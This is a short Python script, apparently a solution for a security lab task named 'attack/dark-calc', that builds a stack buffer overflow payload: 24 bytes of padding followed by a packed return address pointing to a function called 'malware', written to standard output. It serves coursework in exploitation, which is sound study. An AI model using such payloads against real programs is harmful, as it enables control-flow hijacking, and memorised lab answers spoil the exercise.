#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

FIXED_STACK_TOP = 0x721000801000
malware = 0x4019B4

payload = b"A" * 24 + p64(malware)

sys.stdout.buffer.write(payload)
